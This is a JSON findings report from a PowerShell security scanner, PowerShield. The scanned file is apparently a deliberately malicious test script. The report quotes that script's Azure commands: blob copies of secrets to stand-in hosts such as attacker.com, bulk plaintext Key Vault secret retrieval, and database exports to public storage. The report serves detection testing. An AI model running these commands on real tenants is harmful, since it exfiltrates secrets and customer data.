{
  "Timestamp": "2025-10-25T17:22:20.9417742Z",
  "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
  "FileHash": "74D47095956DF5A0C5A4A61C39826BABF504B77B666278DC830265ACFCB83445",
  "Result": {
    "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
    "Violations": [
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 11,
        "Code": "\"https://external-storage.com/backup/data.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 14,
        "Code": "\"https://mystorage.blob.core.windows.net/data/file.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 14,
        "Code": "\"https://external.com/exfil.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 17,
        "Code": "\"https://internal.blob.core.windows.net/data/secrets.json\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 17,
        "Code": "\"https://attacker.com/stolen.json\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 20,
        "Code": "\"https://backup.blob.core.windows.net/exports/customerdb.bacpac\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 23,
        "Code": "\"https://publicstorage.blob.core.windows.net/backup/db.bacpac\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 77,
        "Code": "\"https://authorized-backup.blob.core.windows.net/backups/test.bacpac\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "AzurePowerShellCredentialLeaks",
        "Message": "Azure Key Vault secret retrieved into variable. Ensure proper access controls and avoid plaintext handling.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 26,
        "Code": "Get-AzKeyVaultSecret -VaultName \"prod-keyvault\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzurePowerShellCredentialLeaks",
        "Metadata": {}
      },
      {
        "Name": "AzurePowerShellCredentialLeaks",
        "Message": "Azure Key Vault secret retrieved into variable. Ensure proper access controls and avoid plaintext handling.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 28,
        "Code": "Get-AzKeyVaultSecret -VaultName \"prod-keyvault\" -Name $secret.Name -AsPlainText",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzurePowerShellCredentialLeaks",
        "Metadata": {}
      },
      {
        "Name": "AzurePowerShellCredentialLeaks",
        "Message": "Azure Key Vault secret retrieved into variable. Ensure proper access controls and avoid plaintext handling.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 36,
        "Code": "Get-AzKeyVaultSecret -VaultName $vaultName -Name $name",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzurePowerShellCredentialLeaks",
        "Metadata": {}
      },
      {
        "Name": "AzurePowerShellCredentialLeaks",
        "Message": "Azure Key Vault secret retrieved into variable. Ensure proper access controls and avoid plaintext handling.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 68,
        "Code": "Get-AzKeyVaultSecret -VaultName \"prod-keyvault\" -Name \"DatabaseConnectionString\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzurePowerShellCredentialLeaks",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Blob copy to external URI detected. Verify destination is authorized.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 11,
        "Code": "Start-AzStorageBlobCopy -AbsoluteUri \"https://external-storage.com/backup/data.txt\" -DestBlob \"exported.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Blob copy to external URI detected. Verify destination is authorized.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 14,
        "Code": "Start-AzStorageBlobCopy -SourceUri \"https://mystorage.blob.core.windows.net/data/file.txt\" -DestinationUri \"https://external.com/exfil.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Blob copy to external URI detected. Verify destination is authorized.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 17,
        "Code": "Start-AzureStorageBlobCopy -SrcUri \"https://internal.blob.core.windows.net/data/secrets.json\" -DestinationUri \"https://attacker.com/stolen.json\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "SQL Database export detected. Ensure destination storage is secured and authorized.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 20,
        "Code": "Export-AzSqlDatabase -ResourceGroupName \"Production\" -ServerName \"sql-prod\" -DatabaseName \"CustomerDB\" -StorageKeyType \"StorageAccessKey\" -StorageKey $key -StorageUri \"https://backup.blob.core.windows.net/exports/customerdb.bacpac\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "SQL Database export detected. Ensure destination storage is secured and authorized.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 23,
        "Code": "Export-AzSqlDatabase -ResourceGroupName \"RG-Prod\" -ServerName \"prod-sql-01\" -DatabaseName \"SensitiveData\" -StorageKeyType \"Primary\" -StorageKey \"key123\" -StorageUri \"https://publicstorage.blob.core.windows.net/backup/db.bacpac\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "SQL Database export detected. Ensure destination storage is secured and authorized.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 77,
        "Code": "Export-AzSqlDatabase -ResourceGroupName \"Production\" -ServerName \"sql-prod\" -DatabaseName \"TestDB\" -StorageUri \"https://authorized-backup.blob.core.windows.net/backups/test.bacpac\" -StorageKeyType \"StorageAccessKey\" -StorageKey $authorizedKey",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Bulk Key Vault secret retrieval detected. Ensure proper authorization and monitoring.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 28,
        "Code": "Get-AzKeyVaultSecret -VaultName \"prod-keyvault\" -Name $secret.Name -AsPlainText",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Bulk Key Vault secret retrieval detected. Ensure proper authorization and monitoring.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 36,
        "Code": "Get-AzKeyVaultSecret -VaultName $vaultName -Name $name",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Resource group export detected. May contain sensitive configuration data.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 46,
        "Code": "Export-AzResourceGroup -ResourceGroupName \"Production-RG\" -Path \"C:\\exports\\prod-config.json\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Resource group export detected. May contain sensitive configuration data.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 49,
        "Code": "Export-AzResourceGroup -ResourceGroupName \"Security-Resources\" -Path \"\\\\external-share\\backup\\security.json\" -Force",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Resource group export detected. May contain sensitive configuration data.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 52,
        "Code": "Export-AzResourceGroup -ResourceGroupName \"All-Production\" -Path \"C:\\temp\\production-export.json\" -IncludeParameterDefaultValue",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Key Vault backup detected. Ensure backup location is secure and properly monitored.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 55,
        "Code": "Backup-AzKeyVault -VaultName \"prod-keyvault\" -OutputFile \"C:\\backups\\keyvault.backup\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Key Vault backup detected. Ensure backup location is secure and properly monitored.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 58,
        "Code": "Backup-AzKeyVault -VaultName \"enterprise-kv\" -OutputFile \"\\\\fileserver\\backups\\kv-backup.dat\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "AzureDataExfiltration",
        "Message": "Key Vault backup detected. Ensure backup location is secure and properly monitored.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 61,
        "Code": "Backup-AzKeyVault -VaultName \"sensitive-vault\" -OutputFile \"D:\\exports\\vault.bak\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "AzureDataExfiltration",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://mystorage.blob.core.windows.net/data/file.txt. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 14,
        "Code": "\"https://mystorage.blob.core.windows.net/data/file.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://internal.blob.core.windows.net/data/secrets.json. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 17,
        "Code": "\"https://internal.blob.core.windows.net/data/secrets.json\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://backup.blob.core.windows.net/exports/customerdb.bacpac. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 20,
        "Code": "\"https://backup.blob.core.windows.net/exports/customerdb.bacpac\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://publicstorage.blob.core.windows.net/backup/db.bacpac. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 23,
        "Code": "\"https://publicstorage.blob.core.windows.net/backup/db.bacpac\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://authorized-backup.blob.core.windows.net/backups/test.bacpac. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 77,
        "Code": "\"https://authorized-backup.blob.core.windows.net/backups/test.bacpac\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/azure-data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      }
    ],
    "ParseErrors": [],
    "RulesExecuted": 52,
    "Timestamp": "2025-10-25T17:22:20.9406676+00:00"
  }
}
